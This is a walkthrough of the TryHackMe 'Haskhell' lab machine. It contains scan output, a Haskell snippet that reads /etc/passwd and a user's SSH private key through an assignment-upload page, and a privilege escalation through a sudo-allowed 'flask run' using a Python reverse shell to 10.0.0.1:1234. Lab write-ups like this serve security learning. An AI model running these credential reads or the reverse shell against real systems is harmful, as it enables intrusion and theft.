I"[<h2 id="description">Description:</h2>

<p>The Following Post is writeup of Haskhell room of tryhackme <a href="https://tryhackme.com/room/haskhell">https://tryhackme.com/room/haskhell</a></p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Machine</th>
      <th style="text-align: left">Details</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">OS</td>
      <td style="text-align: left">linux</td>
    </tr>
    <tr>
      <td style="text-align: left">Rating</td>
      <td style="text-align: left">Medium</td>
    </tr>
    <tr>
      <td style="text-align: left">Creator</td>
      <td style="text-align: left">sgtscout</td>
    </tr>
  </tbody>
</table>

<h2 id="summary">Summary:</h2>

<p>The machine have a webpage at port 5001 you will see a message from your prof about uploading assignment
  We made a Simple Haskell script for reading file(I am not good in Haskell). We got lucky about the permissions
  and get id_rsa printed. Login as user then for privesc we have sudo permissions to run flask app and we run python
  reverse shell as flask app.</p>

<h2 id="walkthrough">Walkthrough:</h2>

<h3 id="enumeration">Enumeration</h3>

<p>Lets start with nmap scan</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td> --><td class="rouge-code"><pre><span class="gp">nmap -sC -sV &lt;ip&gt;</span><span class="w">
</span><span class="go">PORT     STATE SERVICE VERSION
</span><span class="gp">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey:
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.91 seconds
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>We can see server at port 5001</p>

<p>letâ€™s dirbust it</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td> --><td class="rouge-code"><pre><span class="go">â”Œâ”€[âœ—]â”€[silver@parrot]â”€[~]
</span><span class="gp">â””â”€â”€â•¼ $</span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-u</span> http://10.10.30.179:5001
<span class="go">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.30.179:5001
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/04 00:56:40 Starting gobuster
===============================================================
/submit (Status: 200)
===============================================================
2020/08/04 01:01:57 Finished
===============================================================
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>we got a submit dir letâ€™s see what we can submit
We need to make a haskell script to see if we can get any output or not</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre><span class="gp">â””â”€â”€â•¼ $</span><span class="nb">cat </span>try.hs
<span class="go">main = do
 x &lt;- readFile "/etc/passwd"
 putStr x
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Now we know prof lets check out .ssh key
So we changed the readfile to /home/prof/.ssh/id_rsa</p>

<p>we got key hurray crack using john</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td> --><td class="rouge-code"><pre><span class="gp">â””â”€â”€â•¼ $</span>/usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> crack.hash
<span class="go">id_rsa has no password!


</span><span class="gp">prof@haskhell:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run

Now we know flask run python let's try with python rev shell

</span><span class="gp">python -c 'import socket,subprocess,os;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.0.0.1"</span>,1234<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">"/bin/sh"</span>,<span class="s2">"-i"</span><span class="o">])</span><span class="p">;</span><span class="s1">'
</span><span class="go">
</span><span class="gp">    $</span><span class="w"> </span><span class="nb">export </span><span class="nv">FLASK_APP</span><span class="o">=</span>hello.py
<span class="gp">    $</span><span class="w"> </span><span class="nb">export </span><span class="nv">FLASK_DEBUG</span><span class="o">=</span>1
<span class="gp">    $</span><span class="w"> </span>flask run
<span class="go">
nc -lvnp 1234
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Rooted</p>
:ET